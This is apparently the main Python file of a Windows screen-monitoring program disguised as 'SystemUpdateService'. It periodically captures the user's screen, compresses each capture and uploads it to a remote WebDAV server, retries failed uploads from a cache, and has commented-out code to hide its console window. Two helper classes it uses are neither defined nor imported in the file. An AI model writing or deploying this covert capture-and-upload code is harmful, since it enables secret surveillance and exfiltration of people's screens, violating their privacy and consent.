"""
SystemUpdateService - 系统更新服务
Windows 后台屏幕监控主程序
"""

import os
import sys
import time
import threading
import socket
import platform
from datetime import datetime
from pathlib import Path
import tempfile
import json
import logging
from logging.handlers import RotatingFileHandler

# 第三方库
import mss
from PIL import Image
import requests
from requests.auth import HTTPBasicAuth
import schedule

# 本地模块
from utils import load_config, Logger, ensure_single_instance


class ScreenCaptureService:
    """屏幕截图服务"""
    
    def __init__(self):
        self.config = load_config()
        self.logger = Logger(self.config)
        self.uploader = WebDAVUploader(self.config, self.logger)
        self.cache_manager = CacheManager(self.config, self.logger)
        self.running = False
        self.retry_thread = None

        # 获取计算机标识信息
        self.computer_name = self.get_computer_identifier()

        # 确保只有一个实例运行
        if not ensure_single_instance():
            self.logger.error("Another instance is already running")
            sys.exit(1)

        self.logger.info(f"SystemUpdateService initialized on {self.computer_name}")

    def get_computer_identifier(self):
        """获取计算机唯一标识"""
        try:
            # 获取计算机名
            computer_name = socket.gethostname()

            # 清理计算机名，移除特殊字符
            import re
            computer_name = re.sub(r'[^\w\-_]', '', computer_name)

            # 如果计算机名为空或太短，使用用户名
            if len(computer_name) < 3:
                try:
                    computer_name = os.environ.get('USERNAME', 'PC')
                    computer_name = re.sub(r'[^\w\-_]', '', computer_name)
                except:
                    computer_name = 'PC'

            # 限制长度
            if len(computer_name) > 15:
                computer_name = computer_name[:15]

            return computer_name.upper()

        except Exception as e:
            self.logger.warning(f"Failed to get computer name: {e}")
            return "UNKNOWN"

    def generate_filename(self):
        """生成带计算机名和时间戳的文件名"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        return f"{self.computer_name}_{timestamp}.webp"

    def capture_screen(self):
        """截取屏幕"""
        try:
            with mss.mss() as sct:
                # 获取主显示器
                monitor = sct.monitors[1]
                
                # 截图
                screenshot = sct.grab(monitor)
                
                # 转换为PIL图像
                img = Image.frombytes("RGB", screenshot.size, screenshot.bgra, "raw", "BGRX")
                
                # 调整大小（如果需要）
                max_width = self.config['screenshot']['max_width']
                max_height = self.config['screenshot']['max_height']
                
                if img.width > max_width or img.height > max_height:
                    img.thumbnail((max_width, max_height), Image.Resampling.LANCZOS)
                
                return img
                
        except Exception as e:
            self.logger.error(f"Screen capture failed: {str(e)}")
            return None
    
    def compress_image(self, img):
        """压缩图像为WebP格式"""
        try:
            # 生成临时文件名（使用计算机名和时间戳）
            filename = self.generate_filename()
            temp_file = tempfile.NamedTemporaryFile(
                suffix=f"_{filename}",
                delete=False
            )
            temp_file.close()
            
            # 保存为WebP格式
            img.save(
                temp_file.name,
                format='WEBP',
                quality=self.config['screenshot']['quality'],
                optimize=True
            )
            
            return temp_file.name
            
        except Exception as e:
            self.logger.error(f"Image compression failed: {str(e)}")
            return None
    
    def process_screenshot(self):
        """处理截图：截取、压缩、上传"""
        try:
            # 截取屏幕
            img = self.capture_screen()
            if not img:
                return
            
            # 压缩图像
            compressed_file = self.compress_image(img)
            if not compressed_file:
                return
            
            # 生成远程文件名（包含计算机名和时间戳）
            remote_filename = self.generate_filename()
            
            # 尝试上传
            if self.uploader.upload_file(compressed_file, remote_filename):
                # 上传成功，删除临时文件
                os.unlink(compressed_file)
                self.logger.debug(f"Screenshot processed successfully: {remote_filename}")
            else:
                # 上传失败，保存到缓存
                self.cache_manager.save_failed_upload(compressed_file, remote_filename)
                os.unlink(compressed_file)
                
        except Exception as e:
            self.logger.error(f"Screenshot processing failed: {str(e)}")
    
    def retry_failed_uploads(self):
        """重试失败的上传"""
        try:
            cached_files = self.cache_manager.get_cached_files()
            
            for file_path in cached_files:
                remote_filename = file_path.name
                
                if self.uploader.upload_file(file_path, remote_filename):
                    # 上传成功，删除缓存文件
                    self.cache_manager.remove_cached_file(file_path)
                    self.logger.info(f"Retry upload successful: {remote_filename}")
                else:
                    self.logger.warning(f"Retry upload failed: {remote_filename}")
                    
        except Exception as e:
            self.logger.error(f"Retry upload process failed: {str(e)}")
    
    def start_retry_thread(self):
        """启动重试线程"""
        def retry_worker():
            while self.running:
                try:
                    time.sleep(self.config['upload']['retry_interval_seconds'])
                    if self.running:
                        self.retry_failed_uploads()
                        self.cache_manager.cleanup_old_cache()
                except Exception as e:
                    self.logger.error(f"Retry thread error: {str(e)}")
        
        self.retry_thread = threading.Thread(target=retry_worker, daemon=True)
        self.retry_thread.start()
    
    def start(self):
        """启动服务"""
        try:
            self.running = True
            self.logger.info("SystemUpdateService starting...")
            
            # 启动重试线程
            self.start_retry_thread()
            
            # 设置定时任务
            interval = self.config['screenshot']['interval_seconds']
            schedule.every(interval).seconds.do(self.process_screenshot)
            
            self.logger.info(f"Service started, screenshot interval: {interval}s")
            
            # 主循环
            while self.running:
                schedule.run_pending()
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.logger.info("Service interrupted by user")
        except Exception as e:
            self.logger.error(f"Service error: {str(e)}")
        finally:
            self.stop()
    
    def stop(self):
        """停止服务"""
        self.running = False
        self.logger.info("SystemUpdateService stopped")


def main():
    """主函数"""
    try:
        # 隐藏控制台窗口（Windows）
        # if sys.platform == "win32":
        #     import ctypes
        #     ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        # 创建并启动服务
        service = ScreenCaptureService()
        service.start()
        
    except Exception as e:
        # 如果日志系统未初始化，写入临时日志
        try:
            with open("logs/emergency.log", "a", encoding="utf-8") as f:
                f.write(f"{datetime.now()}: Fatal error: {str(e)}\n")
        except:
            pass
        sys.exit(1)


if __name__ == "__main__":
    main()
